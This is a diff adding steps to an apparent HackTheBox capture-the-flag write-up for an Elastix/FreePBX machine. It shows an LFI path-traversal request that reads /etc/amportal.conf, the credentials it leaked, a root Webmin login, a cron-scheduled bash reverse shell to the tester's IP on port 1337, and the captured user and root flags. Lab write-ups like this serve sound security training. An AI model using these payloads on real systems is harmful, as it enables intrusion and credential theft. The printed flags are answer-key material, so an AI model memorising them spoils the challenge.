@@ -76,6 +76,8 @@ Nmap done: 1 IP address (1 host up) scanned in 399.28 seconds
 
 > RESULT - DIRBUSTER
 
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/19e25d20-b5ff-40ee-a0ac-af483f77066b)
+
 
 2. Confused it won't open the web app, to solve this i tried to modify the minimum TLS version. (It's possible that the TLS version of our browser is higher than what the browser supports).
 
@@ -97,3 +99,95 @@ Nmap done: 1 IP address (1 host up) scanned in 399.28 seconds
 ![image](https://github.com/jon-brandy/hackthebox/assets/70703371/27776557-8c7d-44e7-8a68-8a015152663e)
 
 
+4. Since we don't know the elastix version, but things to note here the FreePBX 2.10.0 used with the Elastix 2.2.0 is vulnerable to command injection.
+5. But sadly, after opened the `admin` directory, it renders the FreePBX web service, but the version is below 2.10.0.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/c63da729-e37b-4029-87fd-4a1aa9ee241c)
+
+
+6. For port 10000, it opens a webmin login page.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/986d1c1f-4a52-4166-a681-5ed271bba894)
+
+
+7. Based from the metasploit, the closest one must be the LFI vuln, since we can run directory listing (kinda guessing, never doing this in pentesting 🙏).
+8. Reading the exploitdb [documentation](https://www.exploit-db.com/exploits/37637), we can use --> `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action` whether the webapp is vulnerable to LFI or not.
+
+> RESULT - It is vulnerable.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9d0d5bee-09e0-4772-ad6c-dc7561b4d706)
+
+
+9. It exposes many creds for AMPortal and it's not clear which one we need to use for a certain login portal.
+10. Here's the creds i got so far:
+
+```
+root:jEhdIekWmdjE
+admin:Password
+admin:amp111
+admin:jEhdIekWmdjE
+root:passw0rd 
+```
+
+> TIME SKIP, FOUND THE CORRECT CREDS FOR /ADMIN -> admin:jEhdIekWmdjE
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/9761abb4-5c93-4043-83b2-6a8bc4f917af)
+
+
+> FOR THE WEBMIN --> root:jEhdIekWmdjE
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/49e455ca-1b4b-4241-a14e-5ad30711449b)
+
+
+11. Seems our interest now is in the webmin page, since we're logged in as root, we can scheduled command and cron jobs.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/bf6a7ed7-430d-4428-bc95-5c72b8a0cc4f)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a75523b6-17ec-450b-a870-d14ea451b2c9)
+
+
+12. Awesome, we can add our revere shell payload here, I used this template:
+
+```
+Set a listener on port 1337.
+
+PAYLOAD:
+sh -i >& /dev/tcp/10.10.14.26/1337 0>&1
+
+WHAT TO SEND:
+bash -c 'sh -i >& /dev/tcp/10.10.14.26/1337 0>&1'
+```
+
+> RESULT - need to wait until 09:45
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2a514f8b-87a5-4320-b44c-49feb42eaede)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ea1d275e-9510-449d-b264-681384d89ac5)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8bec72ab-cda9-4c7e-9717-213f4f494626)
+
+
+13. Got the shell!
+
+> GETTING USER FLAG AND ROOT FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/750a640b-735f-46aa-a279-6604f9690d56)
+
+
+## USER FLAG
+
+```
+bc89af94b308f47d87fe1552c5506452
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a44b4cd5-873e-4c8a-8e4e-c704f1a8c823)
+
+
+## ROOT FLAG
+
+```
+6688ccf3476b73a96f40e1d5210feed0
+```
